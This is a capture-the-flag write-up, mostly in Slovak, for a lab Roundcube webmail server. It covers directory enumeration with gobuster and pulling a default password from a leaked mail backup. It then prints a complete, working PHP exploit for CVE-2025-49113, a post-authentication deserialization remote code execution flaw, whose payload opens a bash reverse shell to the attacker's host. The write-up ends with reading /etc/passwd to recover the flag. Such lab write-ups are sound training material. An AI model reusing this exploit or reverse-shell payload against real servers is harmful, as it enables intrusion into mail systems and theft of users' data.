# Zadanie

Hi, emergency troubleshooter,

the e-mail administrator, Bob, was tasked with hastily setting up a new webmail server for temporary access to old e-mails. Verify whether the server is properly secured (you know how it usually goes with temporary services).

Stay grounded!

- Webmail runs on server `webmail.powergrid.tcc`.

**Hints**

- IT department is known for using disposable test accounts `ADM40090`, `ADM40091`, `ADM40092` up to `ADM40099`.

## Riešenie

Stránka zo zadania je aktívna aj na porte 80, ide o roundcube webmail verzie 1.06.10(v zdrojáku svieti `"rcversion":10610`), ktorá je náchylná na `CVE‑2025‑49113` - Post‑Auth Remote Code Execution vulnerability. Čiže dokážem zrejme vytvoriť reverse shell, ale až keď som autentikovaný. To zrejme dokážem, lebo v nápovede je známe meno používateľa, pod ktorým sa môžem prihlásiť, presnejšie rozsah používateľov, ktoré to môžu byť. Bruteforce nepripadá do úvahy, pretože pri pokuse prihlásiť sa a odchytiť hlavičky a telo requestu pre ffuf trval každy request približne 10 sekúnd, takže toto nebude cesta. Skúsim enumerovať endpointy pomocou gobustera a slovníka common.txt.

```shell
 gobuster dir -u http://webmail.powergrid.tcc/ -w common.txt -t 50 -x php,html,txt,bak,config
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://webmail.powergrid.tcc/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              bak,config,php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 286]
/.hta.html            (Status: 403) [Size: 286]
/.hta.txt             (Status: 403) [Size: 286]
/.hta.bak             (Status: 403) [Size: 286]
/.hta.config          (Status: 403) [Size: 286]
/.hta.php             (Status: 403) [Size: 286]
/.htaccess            (Status: 403) [Size: 286]
/.htaccess.bak        (Status: 403) [Size: 286]
/.htaccess.config     (Status: 403) [Size: 286]
/.htaccess.php        (Status: 403) [Size: 286]
/.htaccess.html       (Status: 403) [Size: 286]
/.htaccess.txt        (Status: 403) [Size: 286]
/.htpasswd.bak        (Status: 403) [Size: 286]
/.htpasswd            (Status: 403) [Size: 286]
/.htpasswd.config     (Status: 403) [Size: 286]
/.htpasswd.txt        (Status: 403) [Size: 286]
/.htpasswd.php        (Status: 403) [Size: 286]
/backup               (Status: 301) [Size: 331] [--> http://webmail.powergrid.tcc/backup/]
/.htpasswd.html       (Status: 403) [Size: 286]
/index.php            (Status: 200) [Size: 5327]
/index.php            (Status: 200) [Size: 5327]
/plugins              (Status: 301) [Size: 332] [--> http://webmail.powergrid.tcc/plugins/]
/program              (Status: 301) [Size: 332] [--> http://webmail.powergrid.tcc/program/]
/server-status        (Status: 403) [Size: 286]
/skins                (Status: 301) [Size: 330] [--> http://webmail.powergrid.tcc/skins/]
Progress: 27684 / 27684 (100.00%)
===============================================================
Finished
===============================================================
```

Najzaujimavejší mi príde backup, kde vidím archív 

| Name                 | Last modified    | Size | Description |
| -------------------- | ---------------- | ---- | ----------- |
| maildir-20150507.tgz | 2025-10-22 00:05 | 101M |             |

Rozbalím a grepnem, či tam nenájdem niečo týkajúce sa niektorého s týchto účtov.

```shell
$ grep -R "ADM400" ./temp/maildir
./temp/maildir/dorland-c/all_documents/200_:as the old one and is working fine down here. The USERID is ADM40092 and the
./temp/maildir/dorland-c/discussion_threads/175_:as the old one and is working fine down here. The USERID is ADM40092 and the
./temp/maildir/dorland-c/sent/182_:as the old one and is working fine down here. The USERID is ADM40092 and the
```

Tak predsa sa niečo našlo.

```
Torrey Moorer
08/14/2000 06:51 PM
To: Chris Dorland/CAL/ECT@ECT
cc: Attila Pazmandi/CAL/ECT@ECT 
Subject: New USERID

Chris,

We have set up a new USERID for you which has all of the same trading rights 
as the old one and is working fine down here. The USERID is ADM40092 and the 
default password on it is "WELCOME6". Just let me know if you have any 
trouble at all with it in the morning. In the meantime, Mark Dilworth and Jay 
Webb are still looking over the old USERID to see what exactly is happening 
with it.

Torrey
```

Máme meno `ADM40092` a heslom `WELCOME6`. Je čas na exploit. Penelope už počúva na porte 9010 na IP 10.200.0.33 a našiel som takýto parádny php exploit

```php
<?php
class Crypt_GPG_Engine
{
    public $_process = false;
    public $_gpgconf = '';
    public $_homedir = '';

    public function __construct($_gpgconf)
    {
        $_gpgconf = base64_encode($_gpgconf);
        $this->_gpgconf = "echo \"{$_gpgconf}\"|base64 -d|sh;#";
    }

    public function gadget()
    {
        return '|'. serialize($this) . ';';
    }
}

function checkVersion($baseUrl)
{
    echo "[*] Checking Roundcube version...\n";

    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "User-Agent: Roundcube exploit CVE-2025-49113 - Hakai Security\r\n",
            'ignore_errors' => true,
        ],
    ]);

    $response = file_get_contents($baseUrl, false, $context);

    if ($response === FALSE) {
        echo "[-] Error: Failed to check version.\n";
        exit(1);
    }

    $vulnerableVersions = [
        '10500', '10501', '10502', '10503', '10504', '10505', '10506', '10507', '10508', '10509',
        '10600', '10601', '10602', '10603', '10604', '10605', '10606', '10607', '10608', '10609', '10610'
    ];

    preg_match('/"rcversion":(\d+)/', $response, $matches);

    if (empty($matches[1])) {
        echo "[-] Error: Could not detect Roundcube version.\n";
        exit(1);
    }

    $version = $matches[1];
    echo "[*] Detected Roundcube version: " . $version . "\n";

    if (in_array($version, $vulnerableVersions)) {
        echo "[+] Target is vulnerable!\n";
        return true;
    } else {
        echo "[-] Target is not vulnerable.\n";
        exit(1);
    }
}

function login($baseUrl, $user, $pass)
{
    // Configuration to capture session cookies
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "User-Agent: Roundcube exploit CVE-2025-49113 - Hakai Security\r\n",
            'ignore_errors' => true,
            // 'request_fulluri' => false, // necessary for HTTP proxies like Burp
            // 'proxy' => 'tcp://127.0.0.1:8080',
        ],
    ]);

    // Make a GET request to the initial page
    $response = file_get_contents($baseUrl, false, $context);

    if ($response === FALSE) {
        echo "Error: Failed to obtain the initial page.\n";
        exit(1);
    }

    // Extract the 'roundcube_sessid' cookie
    preg_match('/Set-Cookie: roundcube_sessid=([^;]+)/', implode("\n", $http_response_header), $matches);
    if (empty($matches[1])) {
        echo "Error: 'roundcube_sessid' cookie not found.\n";
        exit(1);
    }
    $sessionCookie = 'roundcube_sessid=' . $matches[1];

    // Extract the CSRF token from the JavaScript code
    preg_match('/"request_token":"([^"]+)"/', $response, $matches);
    if (empty($matches[1])) {
        echo "Error: CSRF token not found.\n";
        exit(1);
    }

    $csrfToken = $matches[1];

    $url = $baseUrl . '/?_task=login';

    $data = http_build_query([
        '_token'    => $csrfToken,
        '_task'     => 'login',
        '_action'   => 'login',
        '_timezone' => 'America/Sao_Paulo',
        '_url'      => '',
        '_user'     => $user,
        '_pass'     => $pass,
    ]);

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n" .
                        "Cookie: " . $sessionCookie . "\r\n",
            'method'  => 'POST',
            'content' => $data,
            'ignore_errors' => true,
            // 'request_fulluri' => true, // necessary for HTTP proxies like Burp
            // 'proxy' => 'tcp://127.0.0.1:8080',
        ],
    ];

    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === FALSE) {
        echo "Error: Failed to make the request.\n";
        exit(1);
    }

    // Check the HTTP status code
    $statusLine = $http_response_header[0];
    preg_match('{HTTP/\S*\s(\d{3})}', $statusLine, $match);
    $status = $match[1];

    if ($status == 401) {
        echo "Error: Incorrect credentials.\n";
        exit(1);
    } elseif ($status != 302) {
        echo "Error: Request failed with status code $status.\n";
        exit(1);
    }

    // Extract the last 'roundcube_sessauth' cookie from the login response, ignoring the cookie with value '-del-'
    preg_match_all('/Set-Cookie: roundcube_sessauth=([^;]+)/', implode("\n", $http_response_header), $matches);
    if (empty($matches[1])) {
        echo "Error: 'roundcube_sessauth' cookie not found.\n";
        exit(1);
    }
    $authCookie = 'roundcube_sessauth=' . end($matches[1]);

    // Extract the 'roundcube_sessid' cookie from the login response
    preg_match('/Set-Cookie: roundcube_sessid=([^;]+)/', implode("\n", $http_response_header), $matches);
    if (empty($matches[1])) {
        echo "Error: 'roundcube_sessid' cookie not found.\n";
        exit(1);
    }
    $sessionCookie = 'roundcube_sessid=' . $matches[1];

    echo "[+] Login successful!\n";

    return [
        'sessionCookie' => $sessionCookie,
        'authCookie' => $authCookie,
    ];
}

function uploadImage($baseUrl, $sessionCookie, $authCookie, $gadget)
{
    $uploadUrl = $baseUrl . '/?_task=settings&_framed=1&_remote=1&_from=edit-!xxx&_id=&_uploadid=upload1749190777535&_unlock=loading1749190777536&_action=upload';

    // Hardcoded PNG image in base64
    $base64Image = 'iVBORw0KGgoAAAANSUhEUgAAAIAAAABcCAYAAACmwr2fAAAAAXNSR0IArs4c6QAAAGxlWElmTU0AKgAAAAgABAEaAAUAAAABAAAAPgEbAAUAAAABAAAARgEoAAMAAAABAAIAAIdpAAQAAAABAAAATgAAAAAAAACQAAAAAQAAAJAAAAABAAKgAgAEAAAAAQAAAICgAwAEAAAAAQAAAFwAAAAAbqF/KQAAAAlwSFlzAAAWJQAAFiUBSVIk8AAAAWBJREFUeAHt1MEJACEAxMDzSvEn2H97CrYx2Q4Swo659vkaa+BnyQN/BgoAD6EACgA3gOP3AAWAG8Dxe4ACwA3g+D1AAeAGcPweoABwAzh+D1AAuAEcvwcoANwAjt8DFABuAMfvAQoAN4Dj9wAFgBvA8XuAAsAN4Pg9QAHgBnD8HqAAcAM4fg9QALgBHL8HKADcAI7fAxQAbgDH7wEKADeA4/cABYAbwPF7gALADeD4PUAB4AZw/B6gAHADOH4PUAC4ARy/BygA3ACO3wMUAG4Ax+8BCgA3gOP3AAWAG8Dxe4ACwA3g+D1AAeAGcPweoABwAzh+D1AAuAEcvwcoANwAjt8DFABuAMfvAQoAN4Dj9wAFgBvA8XuAAsAN4Pg9QAHgBnD8HqAAcAM4fg9QALgBHL8HKADcAI7fAxQAbgDH7wEKADeA4/cABYAbwPF7gALADeD4PUAB4AZw/B4AD+ACXpACLpoPsQQAAAAASUVORK5CYII=';

    // Decode the base64 image
    $fileContent = base64_decode($base64Image);
    if ($fileContent === FALSE) {
        echo "Error: Failed to decode the base64 image.\n";
        exit(1);
    }

    $boundary = uniqid();
    $data = "--" . $boundary . "\r\n" .
            "Content-Disposition: form-data; name=\"_file[]\"; filename=\"" . $gadget . "\"\r\n" .
            "Content-Type: image/png\r\n\r\n" .
            $fileContent . "\r\n" .
            "--" . $boundary . "--\r\n";

    $options = [
        'http' => [
            'header'  => "Content-type: multipart/form-data; boundary=" . $boundary . "\r\n" .
                        "Cookie: " . $sessionCookie . "; " . $authCookie . "\r\n",
            'method'  => 'POST',
            'content' => $data,
            'ignore_errors' => true,
            // 'request_fulluri' => true, // necessary for HTTP proxies like Burp
            // 'proxy' => 'tcp://127.0.0.1:8080',
        ],
    ];

    echo "[*] Exploiting...\n";

    $context  = stream_context_create($options);
    $result = file_get_contents($uploadUrl, false, $context);

    if ($result === FALSE) {
        echo "Error: Failed to send the file.\n";
        exit(1);
    }

    // Check the HTTP status code
    $statusLine = $http_response_header[0];
    preg_match('{HTTP/\S*\s(\d{3})}', $statusLine, $match);
    $status = $match[1];

    if ($status != 200) {
        echo "Error: File upload failed with status code $status.\n";
        exit(1);
    }

    echo "[+] Gadget uploaded successfully!\n";
}

function exploit($baseUrl, $user, $pass, $rceCommand)
{
    echo "[+] Starting exploit (CVE-2025-49113)...\n";

    // Check version before proceeding
    checkVersion($baseUrl);

    // Instantiate the Crypt_GPG_Engine class with the RCE command
    $gpgEngine = new Crypt_GPG_Engine($rceCommand);
    $gadget = $gpgEngine->gadget();

    // Escape double quotes in the gadget
    $gadget = str_replace('"', '\\"', $gadget);

    // Login and get session cookies
    $cookies = login($baseUrl, $user, $pass);

    // Upload the image with the gadget
    uploadImage($baseUrl, $cookies['sessionCookie'], $cookies['authCookie'], $gadget);
}


$baseUrl = "http://webmail.powergrid.tcc/";
$user = "ADM40092";
$pass = "WELCOME6";
$rceCommand = '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.200.0.33/9010 0>&1" > /dev/null 2>&1 &';

exploit($baseUrl, $user, $pass, $rceCommand);
```

Spustím, vypíše toto

```shell
t$ php CVE-2025-49113.php
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
[+] Gadget uploaded successfully!
```

A už počujem notifikáciu z terminálu, že sa spojenie uskutočnilo. Po chvíli hľadania vlajky ako súboru, env premenných alebo podobne som ju našiel nakoniec v súbore `/etc/passwd`

```
www-data@86ac94bc7505:/etc$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
_galera:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:101:MariaDB Server,,,:/nonexistent:/bin/false
dovecot:x:102:103:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:103:104:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
postfix:x:104:105::/var/spool/postfix:/usr/sbin/nologin
flag:x:65535:65535:RkxBR3tXbThuLXQ1cWUteEhueS1nNEdPfQ==:/nonexistent:/usr/sbin/nologin
adm40092:x:1001:1001::/home/adm40092:/bin/sh
```

Pri používateľovi flag v časti **User ID Info** resp Comment je base64, ktoré ukrýva vlajku.

> flag\:x\:65535\:65535\:RkxBR3tXbThuLXQ1cWUteEhueS1nNEdPfQ==\:/nonexistent:/usr/sbin/nologin

## Vlajka

    FLAG{Wm8n-t5qe-xHny-g4GO}
